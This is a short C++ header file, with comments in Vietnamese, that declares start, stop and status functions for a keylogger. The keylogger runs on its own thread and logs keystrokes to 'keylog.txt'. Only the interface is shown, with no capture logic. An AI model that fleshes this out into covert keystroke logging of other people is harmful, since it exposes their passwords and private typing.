#pragma once
#include <fstream>
#include <atomic>
#include <thread> // Cần để chạy luồng riêng

/**
 * @brief Bắt đầu chạy keylogger trên một luồng riêng biệt.
 * Ghi log vào file "keylog.txt".
 */
void startKeylogger();

/**
 * @brief Dừng keylogger và dọn dẹp luồng.
 */
void stopKeylogger();

/**
 * @brief Kiểm tra xem keylogger có đang chạy hay không.
 * @return true nếu đang chạy, false nếu không.
 */
bool isKeyloggerRunning();